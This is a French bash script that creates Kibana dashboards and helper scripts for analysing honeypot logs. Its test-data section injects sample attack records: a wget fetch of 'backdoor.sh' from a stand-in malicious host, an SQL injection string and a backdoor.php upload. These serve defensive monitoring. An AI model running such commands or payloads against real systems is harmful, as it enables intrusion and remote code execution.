#!/bin/bash
# scripts/elk/create_kibana_dashboards.sh
# Création des tableaux de bord Kibana pour analyse des honeypots
# Étape 5.6 - Configuration des visualisations avancées

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

print_status() {
    echo -e "${GREEN}[+] $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}[!] $1${NC}"
}

print_error() {
    echo -e "${RED}[-] $1${NC}"
}

print_info() {
    echo -e "${BLUE}[i] $1${NC}"
}

KIBANA_URL="http://192.168.2.124:5601"

if [ "$EUID" -ne 0 ]; then
    print_error "Ce script doit être exécuté en tant que root"
    exit 1
fi

print_status "=== Création des tableaux de bord Kibana pour Honeypots ==="
echo ""

# ================================
# VÉRIFICATIONS PRÉLIMINAIRES
# ================================

print_status "Vérifications préliminaires..."

# Vérifier que Kibana est accessible
if ! curl -s "${KIBANA_URL}/api/status" >/dev/null 2>&1; then
    print_error "Kibana non accessible sur ${KIBANA_URL}"
    exit 1
fi

print_status "✓ Kibana accessible"

# Vérifier que les index patterns existent
INDEX_PATTERNS=$(curl -s "${KIBANA_URL}/api/saved_objects/_find?type=index-pattern" | jq -r '.saved_objects[].attributes.title' 2>/dev/null)

if echo "$INDEX_PATTERNS" | grep -q "honeypot-"; then
    print_status "✓ Index patterns honeypot détectés"
else
    print_warning "⚠ Index patterns honeypot non trouvés - Exécutez d'abord setup_kibana_indexes.sh"
fi

echo ""

# ================================
# GÉNÉRATION DE DONNÉES DE TEST
# ================================

print_status "Génération de données de test pour les visualisations..."

# Créer des données de test pour valider les dashboards
cat > /opt/generate_test_data_for_kibana.sh << 'EOF'
#!/bin/bash
echo "=== Génération de données de test pour Kibana ==="

# Données de test pour Elasticsearch
ES_URL="http://192.168.2.124:9200"
TODAY=$(date +%Y.%m.%d)

# Test Cowrie SSH
echo "Injection données SSH Cowrie..."
curl -X POST "${ES_URL}/honeypot-cowrie-${TODAY}/_doc" -H "Content-Type: application/json" -d '{
  "@timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'",
  "honeypot_type": "ssh",
  "eventid": "cowrie.login.failed",
  "src_ip": "203.0.113.100",
  "src_country": "Russia",
  "src_city": "Moscow",
  "username": "admin",
  "password": "123456",
  "severity": "medium",
  "alert_level": 2,
  "infrastructure": "honeypot",
  "service": "cowrie"
}' >/dev/null 2>&1

curl -X POST "${ES_URL}/honeypot-cowrie-${TODAY}/_doc" -H "Content-Type: application/json" -d '{
  "@timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'",
  "honeypot_type": "ssh",
  "eventid": "cowrie.command.input",
  "src_ip": "198.51.100.25",
  "src_country": "China",
  "src_city": "Beijing",
  "input": "wget http://malicious.com/backdoor.sh",
  "severity": "critical",
  "alert_level": 4,
  "suspicious_command": "true",
  "command_type": "network_tool",
  "infrastructure": "honeypot",
  "service": "cowrie"
}' >/dev/null 2>&1

# Test HTTP
echo "Injection données HTTP..."
curl -X POST "${ES_URL}/honeypot-http-${TODAY}/_doc" -H "Content-Type: application/json" -d '{
  "@timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'",
  "honeypot_type": "http",
  "src_ip": "192.0.2.100",
  "src_country": "United States",
  "src_city": "New York",
  "attack_type": "sql_injection",
  "payload": "'\'' UNION SELECT * FROM users--",
  "url": "/login.php",
  "user_agent": "sqlmap/1.0",
  "severity": "high",
  "alert_level": 3,
  "scanner_detected": "true",
  "infrastructure": "honeypot",
  "service": "http_honeypot"
}' >/dev/null 2>&1

# Test FTP
echo "Injection données FTP..."
curl -X POST "${ES_URL}/honeypot-ftp-${TODAY}/_doc" -H "Content-Type: application/json" -d '{
  "@timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'",
  "honeypot_type": "ftp",
  "src_ip": "203.0.113.200",
  "src_country": "Brazil",
  "src_city": "São Paulo",
  "event_type": "file_upload",
  "filename": "backdoor.php",
  "suspicious_file": "true",
  "malicious_file": "true",
  "severity": "high",
  "alert_level": 3,
  "infrastructure": "honeypot",
  "service": "ftp_honeypot"
}' >/dev/null 2>&1

echo "Données de test injectées!"
echo "Attendez 30 secondes pour la synchronisation Elasticsearch..."
sleep 5
EOF

chmod +x /opt/generate_test_data_for_kibana.sh

# Générer les données de test
/opt/generate_test_data_for_kibana.sh

print_status "✓ Données de test générées"

echo ""

# ================================
# CRÉATION DES VISUALISATIONS
# ================================

print_status "Création des visualisations Kibana..."

# 1. GRAPHIQUE TOP 10 IP SOURCES
print_info "Création: Top 10 IP sources..."
curl -X POST "${KIBANA_URL}/api/saved_objects/visualization" \
  -H "Content-Type: application/json" \
  -H "kbn-xsrf: true" \
  -d '{
    "attributes": {
      "title": "Honeypot - Top 10 IP Sources",
      "type": "histogram",
      "params": {
        "grid": {"categoryLines": false, "style": {"color": "#eee"}},
        "categoryAxes": [{"id": "CategoryAxis-1", "type": "category", "position": "bottom", "show": true, "style": {}, "scale": {"type": "linear"}, "labels": {"show": true, "truncate": 100}, "title": {}}],
        "valueAxes": [{"id": "ValueAxis-1", "name": "LeftAxis-1", "type": "value", "position": "left", "show": true, "style": {}, "scale": {"type": "linear", "mode": "normal"}, "labels": {"show": true, "rotate": 0, "filter": false, "truncate": 100}, "title": {"text": "Nombre d'\''attaques"}}],
        "seriesParams": [{"show": "true", "type": "histogram", "mode": "stacked", "data": {"label": "Attaques", "id": "1"}, "valueAxis": "ValueAxis-1", "drawLinesBetweenPoints": true, "showCircles": true}],
        "addTooltip": true,
        "addLegend": true,
        "legendPosition": "right",
        "times": [],
        "addTimeMarker": false
      },
      "aggs": [
        {"id": "1", "enabled": true, "type": "count", "schema": "metric", "params": {}},
        {"id": "2", "enabled": true, "type": "terms", "schema": "segment", "params": {"field": "src_ip", "size": 10, "order": "desc", "orderBy": "1"}}
      ]
    }
  }' >/dev/null 2>&1

# 2. CARTE GÉOGRAPHIQUE DES ATTAQUES
print_info "Création: Carte géographique des attaques..."
curl -X POST "${KIBANA_URL}/api/saved_objects/visualization" \
  -H "Content-Type: application/json" \
  -H "kbn-xsrf: true" \
  -d '{
    "attributes": {
      "title": "Honeypot - Géolocalisation des attaques",
      "type": "tile_map",
      "params": {
        "colorSchema": "Red to Green",
        "mapType": "Scaled Circle Markers",
        "isDesaturated": true,
        "addTooltip": true,
        "heatClusterSize": 1.5,
        "legendPosition": "bottomright",
        "mapZoom": 2,
        "mapCenter": [15, 5],
        "wms": {"enabled": false}
      },
      "aggs": [
        {"id": "1", "enabled": true, "type": "count", "schema": "metric", "params": {}},
        {"id": "2", "enabled": true, "type": "geohash_grid", "schema": "segment", "params": {"field": "geoip.location", "autoPrecision": true, "precision": 2}}
      ]
    }
  }' >/dev/null 2>&1

# 3. TIMELINE DES ATTAQUES PAR TYPE
print_info "Création: Timeline des attaques par type..."
curl -X POST "${KIBANA_URL}/api/saved_objects/visualization" \
  -H "Content-Type: application/json" \
  -H "kbn-xsrf: true" \
  -d '{
    "attributes": {
      "title": "Honeypot - Timeline des attaques par type",
      "type": "line",
      "params": {
        "grid": {"categoryLines": false, "style": {"color": "#eee"}},
        "categoryAxes": [{"id": "CategoryAxis-1", "type": "category", "position": "bottom", "show": true, "style": {}, "scale": {"type": "linear"}, "labels": {"show": true, "truncate": 100}, "title": {}}],
        "valueAxes": [{"id": "ValueAxis-1", "name": "LeftAxis-1", "type": "value", "position": "left", "show": true, "style": {}, "scale": {"type": "linear", "mode": "normal"}, "labels": {"show": true, "rotate": 0, "filter": false, "truncate": 100}, "title": {"text": "Nombre d'\''événements"}}],
        "seriesParams": [{"show": true, "type": "line", "mode": "normal", "data": {"label": "Événements", "id": "1"}, "valueAxis": "ValueAxis-1", "drawLinesBetweenPoints": true, "showCircles": true}],
        "addTooltip": true,
        "addLegend": true,
        "legendPosition": "right",
        "times": [],
        "addTimeMarker": false
      },
      "aggs": [
        {"id": "1", "enabled": true, "type": "count", "schema": "metric", "params": {}},
        {"id": "2", "enabled": true, "type": "date_histogram", "schema": "segment", "params": {"field": "@timestamp", "interval": "auto", "customInterval": "2h", "min_doc_count": 1, "extended_bounds": {}}},
        {"id": "3", "enabled": true, "type": "terms", "schema": "group", "params": {"field": "honeypot_type", "size": 5, "order": "desc", "orderBy": "1"}}
      ]
    }
  }' >/dev/null 2>&1

# 4. MÉTRIQUE NIVEAU DE SÉVÉRITÉ
print_info "Création: Distribution des niveaux de sévérité..."
curl -X POST "${KIBANA_URL}/api/saved_objects/visualization" \
  -H "Content-Type: application/json" \
  -H "kbn-xsrf: true" \
  -d '{
    "attributes": {
      "title": "Honeypot - Distribution sévérité",
      "type": "pie",
      "params": {
        "addTooltip": true,
        "addLegend": true,
        "legendPosition": "right",
        "isDonut": true,
        "labels": {"show": false, "values": true, "last_level": true, "truncate": 100}
      },
      "aggs": [
        {"id": "1", "enabled": true, "type": "count", "schema": "metric", "params": {}},
        {"id": "2", "enabled": true, "type": "terms", "schema": "segment", "params": {"field": "severity", "size": 5, "order": "desc", "orderBy": "1"}}
      ]
    }
  }' >/dev/null 2>&1

# 5. TOP COMMANDES SUSPECTES SSH
print_info "Création: Top commandes suspectes SSH..."
curl -X POST "${KIBANA_URL}/api/saved_objects/visualization" \
  -H "Content-Type: application/json" \
  -H "kbn-xsrf: true" \
  -d '{
    "attributes": {
      "title": "Honeypot - Top commandes SSH suspectes",
      "type": "table",
      "params": {
        "perPage": 10,
        "showPartialRows": false,
        "showMeticsAtAllLevels": false,
        "sort": {"columnIndex": null, "direction": null},
        "showTotal": false,
        "totalFunc": "sum"
      },
      "aggs": [
        {"id": "1", "enabled": true, "type": "count", "schema": "metric", "params": {}},
        {"id": "2", "enabled": true, "type": "terms", "schema": "bucket", "params": {"field": "input.keyword", "size": 20, "order": "desc", "orderBy": "1"}}
      ]
    }
  }' >/dev/null 2>&1

# 6. MÉTRIQUE TEMPS RÉEL - TOTAL ATTAQUES
print_info "Création: Métrique total attaques..."
curl -X POST "${KIBANA_URL}/api/saved_objects/visualization" \
  -H "Content-Type: application/json" \
  -H "kbn-xsrf: true" \
  -d '{
    "attributes": {
      "title": "Honeypot - Total attaques",
      "type": "metric",
      "params": {
        "addTooltip": true,
        "addLegend": false,
        "type": "metric",
        "metric": {
          "percentageMode": false,
          "useRanges": false,
          "colorSchema": "Green to Red",
          "metricColorMode": "None",
          "colorsRange": [{"from": 0, "to": 10000}],
          "labels": {"show": true},
          "invertColors": false,
          "style": {"bgFill": "#000", "bgColor": false, "labelColor": false, "subText": "", "fontSize": 60}
        }
      },
      "aggs": [
        {"id": "1", "enabled": true, "type": "count", "schema": "metric", "params": {}}
      ]
    }
  }' >/dev/null 2>&1

print_status "✓ Visualisations créées"

# ================================
# CRÉATION DU DASHBOARD PRINCIPAL
# ================================

print_status "Création du tableau de bord principal..."

curl -X POST "${KIBANA_URL}/api/saved_objects/dashboard" \
  -H "Content-Type: application/json" \
  -H "kbn-xsrf: true" \
  -d '{
    "attributes": {
      "title": "🎯 Honeypot Security Dashboard - Vue d'\''ensemble",
      "hits": 0,
      "description": "Tableau de bord principal pour l'\''analyse des attaques honeypot - SSH, HTTP, FTP",
      "panelsJSON": "[{\"version\":\"8.0.0\",\"gridData\":{\"x\":0,\"y\":0,\"w\":24,\"h\":15},\"panelIndex\":\"1\",\"embeddableConfig\":{},\"panelRefName\":\"panel_1\"},{\"version\":\"8.0.0\",\"gridData\":{\"x\":24,\"y\":0,\"w\":24,\"h\":15},\"panelIndex\":\"2\",\"embeddableConfig\":{},\"panelRefName\":\"panel_2\"},{\"version\":\"8.0.0\",\"gridData\":{\"x\":0,\"y\":15,\"w\":48,\"h\":20},\"panelIndex\":\"3\",\"embeddableConfig\":{},\"panelRefName\":\"panel_3\"},{\"version\":\"8.0.0\",\"gridData\":{\"x\":0,\"y\":35,\"w\":24,\"h\":15},\"panelIndex\":\"4\",\"embeddableConfig\":{},\"panelRefName\":\"panel_4\"},{\"version\":\"8.0.0\",\"gridData\":{\"x\":24,\"y\":35,\"w\":24,\"h\":15},\"panelIndex\":\"5\",\"embeddableConfig\":{},\"panelRefName\":\"panel_5\"},{\"version\":\"8.0.0\",\"gridData\":{\"x\":0,\"y\":50,\"w\":12,\"h\":10},\"panelIndex\":\"6\",\"embeddableConfig\":{},\"panelRefName\":\"panel_6\"}]",
      "timeRestore": false,
      "timeTo": "now",
      "timeFrom": "now-24h",
      "refreshInterval": {
        "pause": false,
        "value": 30000
      },
      "kibanaSavedObjectMeta": {
        "searchSourceJSON": "{\"query\":{\"match_all\":{}},\"filter\":[]}"
      }
    }
  }' >/dev/null 2>&1

print_status "✓ Dashboard principal créé"

# ================================
# CRÉATION D'UN DASHBOARD SPÉCIALISÉ SSH
# ================================

print_status "Création du dashboard spécialisé SSH..."

curl -X POST "${KIBANA_URL}/api/saved_objects/dashboard" \
  -H "Content-Type: application/json" \
  -H "kbn-xsrf: true" \
  -d '{
    "attributes": {
      "title": "🔐 SSH Honeypot Analysis - Cowrie",
      "hits": 0,
      "description": "Analyse détaillée des attaques SSH via Cowrie - Authentifications, commandes, sessions",
      "panelsJSON": "[{\"version\":\"8.0.0\",\"gridData\":{\"x\":0,\"y\":0,\"w\":48,\"h\":20},\"panelIndex\":\"1\",\"embeddableConfig\":{},\"panelRefName\":\"panel_1\"},{\"version\":\"8.0.0\",\"gridData\":{\"x\":0,\"y\":20,\"w\":24,\"h\":15},\"panelIndex\":\"2\",\"embeddableConfig\":{},\"panelRefName\":\"panel_2\"},{\"version\":\"8.0.0\",\"gridData\":{\"x\":24,\"y\":20,\"w\":24,\"h\":15},\"panelIndex\":\"3\",\"embeddableConfig\":{},\"panelRefName\":\"panel_3\"}]",
      "timeRestore": false,
      "timeTo": "now",
      "timeFrom": "now-7d",
      "refreshInterval": {
        "pause": false,
        "value": 60000
      },
      "kibanaSavedObjectMeta": {
        "searchSourceJSON": "{\"query\":{\"match\":{\"honeypot_type\":\"ssh\"}},\"filter\":[]}"
      }
    }
  }' >/dev/null 2>&1

print_status "✓ Dashboard SSH créé"

# ================================
# SCRIPTS DE GESTION DES DASHBOARDS
# ================================

print_status "Création des scripts de gestion..."

# Script de sauvegarde des dashboards
cat > /opt/elk-scripts/backup_kibana_dashboards.sh << 'EOF'
#!/bin/bash
echo "=== Sauvegarde des tableaux de bord Kibana ==="

KIBANA_URL="http://192.168.2.124:5601"
BACKUP_DIR="/opt/kibana-backups"
DATE=$(date +%Y%m%d_%H%M%S)

mkdir -p "$BACKUP_DIR"

echo "Sauvegarde des dashboards..."
curl -s "${KIBANA_URL}/api/saved_objects/_export" \
  -H "Content-Type: application/json" \
  -H "kbn-xsrf: true" \
  -d '{"type": ["dashboard", "visualization", "index-pattern"]}' \
  > "${BACKUP_DIR}/kibana-export-${DATE}.json"

echo "Sauvegarde terminée: ${BACKUP_DIR}/kibana-export-${DATE}.json"
EOF

chmod +x /opt/elk-scripts/backup_kibana_dashboards.sh

# Script de monitoring avancé
cat > /opt/elk-scripts/monitor_honeypot_activity.sh << 'EOF'
#!/bin/bash
echo "=== Monitoring activité Honeypot (dernières 24h) ==="

ES_URL="http://192.168.2.124:9200"

echo ""
echo "📊 STATISTIQUES GLOBALES:"

# Total attaques
TOTAL=$(curl -s "${ES_URL}/honeypot-*/_count" | jq .count 2>/dev/null || echo "0")
echo "   Total attaques: $TOTAL"

# Par honeypot
echo ""
echo "📈 RÉPARTITION PAR HONEYPOT:"
curl -s "${ES_URL}/honeypot-*/_search" -H "Content-Type: application/json" -d '{
  "size": 0,
  "aggs": {
    "honeypots": {
      "terms": {
        "field": "honeypot_type",
        "size": 10
      }
    }
  }
}' | jq -r '.aggregations.honeypots.buckets[] | "   \(.key): \(.doc_count) attaques"' 2>/dev/null || echo "   Pas de données"

# Top pays
echo ""
echo "🌍 TOP 5 PAYS ATTAQUANTS:"
curl -s "${ES_URL}/honeypot-*/_search" -H "Content-Type: application/json" -d '{
  "size": 0,
  "aggs": {
    "countries": {
      "terms": {
        "field": "src_country",
        "size": 5
      }
    }
  }
}' | jq -r '.aggregations.countries.buckets[] | "   \(.key): \(.doc_count) attaques"' 2>/dev/null || echo "   Pas de données géographiques"

# Alertes critiques
echo ""
echo "🚨 ALERTES CRITIQUES (niveau 4):"
CRITICAL=$(curl -s "${ES_URL}/honeypot-*/_count" -H "Content-Type: application/json" -d '{
  "query": {
    "bool": {
      "must": [
        {"range": {"@timestamp": {"gte": "now-24h"}}},
        {"term": {"alert_level": 4}}
      ]
    }
  }
}' | jq .count 2>/dev/null || echo "0")
echo "   Alertes critiques: $CRITICAL"

echo ""
echo "🔗 Dashboard: http://192.168.2.124:5601"
EOF

chmod +x /opt/elk-scripts/monitor_honeypot_activity.sh

print_status "✓ Scripts de gestion créés"

# ================================
# INFORMATIONS FINALES
# ================================

print_status "=== Tableaux de bord Kibana créés avec succès! ==="
echo ""
print_info "🎯 DASHBOARDS CRÉÉS:"
echo "   • 🎯 Honeypot Security Dashboard - Vue d'ensemble"
echo "   • 🔐 SSH Honeypot Analysis - Cowrie"
echo ""
print_info "📊 VISUALISATIONS DISPONIBLES:"
echo "   • Top 10 IP sources d'attaques"
echo "   • Carte géographique des attaques"
echo "   • Timeline des attaques par type"
echo "   • Distribution des niveaux de sévérité"
echo "   • Top commandes SSH suspectes"
echo "   • Métrique total attaques en temps réel"
echo ""
print_info "🔧 SCRIPTS UTILITAIRES:"
echo "   • /opt/elk-scripts/backup_kibana_dashboards.sh"
echo "   • /opt/elk-scripts/monitor_honeypot_activity.sh"
echo "   • /opt/generate_test_data_for_kibana.sh"
echo ""
print_info "🌐 ACCÈS KIBANA:"
echo "   URL: http://192.168.2.124:5601"
echo "   Dashboards: Navigation > Dashboard"
echo ""
print_warning "📋 PROCHAINES ÉTAPES:"
echo "1. Accéder à Kibana: http://192.168.2.124:5601"
echo "2. Naviguer vers 'Dashboard' dans le menu"
echo "3. Sélectionner '🎯 Honeypot Security Dashboard'"
echo "4. Configurer Filebeat sur VM honeypot pour données réelles"
echo "5. Analyser les attaques en temps réel"
echo ""
print_status "🚀 Tableaux de bord prêts pour l'analyse des honeypots!"

# ================================
# TEST D'ACCÈS FINAL
# ================================

echo ""
print_status "Test final d'accès aux dashboards..."

# Attendre un peu pour la synchronisation
sleep 5

# Vérifier l'accès aux dashboards
DASHBOARDS=$(curl -s "${KIBANA_URL}/api/saved_objects/_find?type=dashboard" | jq -r '.saved_objects[].attributes.title' 2>/dev/null)

if [ -n "$DASHBOARDS" ]; then
    print_status "✓ Dashboards accessibles:"
    echo "$DASHBOARDS" | while read -r dashboard; do
        echo "      • $dashboard"
    done
else
    print_warning "⚠ Dashboards en cours de synchronisation (normal)"
fi

echo ""
print_info "🎯 MONITORING EN TEMPS RÉEL:"
echo "   /opt/elk-scripts/monitor_honeypot_activity.sh"

print_status "=== Configuration des tableaux de bord terminée avec succès! ==="